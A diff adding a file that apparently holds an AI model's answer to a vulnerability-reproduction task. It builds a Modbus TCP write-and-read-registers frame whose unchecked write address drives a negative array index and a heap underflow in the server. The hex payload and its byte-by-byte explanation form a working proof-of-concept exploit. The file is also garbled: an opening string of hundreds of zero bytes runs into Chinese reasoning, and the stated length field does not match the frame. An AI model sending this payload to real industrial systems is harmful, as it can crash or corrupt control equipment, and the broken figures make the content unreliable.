@@ -1,0 +1,46 @@
+{
+  "hex_bytes": "00 01 00 00 00 17 01 17 00 00 00 01 00 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 极端的负值，例如 -1（0xFFFF），但服务器配置 start_registers=352, nb_registers=32，因此有效地址范围是 352 到 383。我们选择写起始地址为 0（0x0000），这远低于 352，因此 mapping_address_write 将为负（0 - 352 = -352）。读取部分使用有效地址（例如 352）和长度 1 以通过其他检查。
+
+Modbus TCP 帧结构：
+- 事务标识符：00 01（任意）
+- 协议标识符：00 00（Modbus）
+- 长度：00 17（23 字节，因为 PDU 为 17 字节）
+- 单元标识符：01（任意）
+- 功能码：17（0x17）
+- 读取起始地址：01 60（352 = 0x0160）
+- 读取数量：00 01（1 个寄存器）
+- 写入起始地址：00 00（0，导致 mapping_address_write = 0 - 352 = -352）
+- 写入数量：00 01（1 个寄存器）
+- 写入字节数：02（2 字节，因为每个寄存器为 2 字节）
+- 写入数据：00 00（任意值）
+
+因此，原始帧应为：
+00 01 00 00 00 17 01 17 01 60 00 01 00 00 00 01 02 00 00
+
+但为了确保长度字段正确，PDU 长度为 17 字节（从单元标识符到写入数据结束），因此长度字段应为 00 17（23 字节，包括 MBAP 头）。所以帧为：
+00 01 00 00 00 17 01 17 01 60 00 01 00 00 00 01 02 00 00
+
+解释：
+- 事务标识符: 00 01 (任意)
+- 协议标识符: 00 00 (Modbus)
+- 长度: 00 17 (23 字节)
+- 单元标识符: 01
+- 功能码: 17 (写和读寄存器)
+- 读取起始地址: 01 60 (352, 有效)
+- 读取数量: 00 01 (1, 有效)
+- 写入起始地址: 00 00 (0, 无效，低于 start_registers=352)
+- 写入数量: 00 01 (1)
+- 写入字节数: 02
+- 写入数据: 00 00 (任意)
+
+此帧通过读取部分的检查（地址 352 和数量 1 在范围内），但写入起始地址 0 导致 mapping_address_write = 0 - 352 = -352，为负数。由于守卫只检查 mapping_address（读取部分）两次，而未检查 mapping_address_write，因此代码继续执行。然后，写入循环将尝试访问 tab_registers[-352]，导致数组下溢。
+
+预期效果：
+地址清理器（如 ASAN）应检测到数组下溢，报告堆缓冲区溢出或无效内存访问（例如“heap-buffer-overflow”或“index -352 out of bounds”），因为代码尝试写入 tab_registers 开始之前的 memory。
+```json
+{
+  "hex_bytes": "00 01 00 00 00 17 01 17 01 60 00 01 00 00 00 01 02 00 00",
+  "explanation": "Transaction ID: 00 01 (arbitrary). Protocol: 00 00 (Modbus). Length: 00 17 (23 bytes). Unit ID: 01. Function code: 17 (0x17, write_and_read_registers). Read start address: 01 60 (352, valid within 352-383). Read quantity: 00 01 (1, valid). Write start address: 00 00 (0, invalid, below start_registers=352, making mapping_address_write = -352). Write quantity: 00 01 (1). Write byte count: 02. Write data: 00 00 (any). The read passes checks (address 352 valid), but the write address 0 is never validated (guard tests only read address twice), leading to negative index access in tab_registers.",
+  "expected_effect": "Address sanitizer (ASAN) should report a heap-buffer-overflow or invalid memory access (e.g., 'index -352 out of bounds for type 'uint16_t[]') when the write loop attempts to store data at tab_registers[-352]."
+}
+```
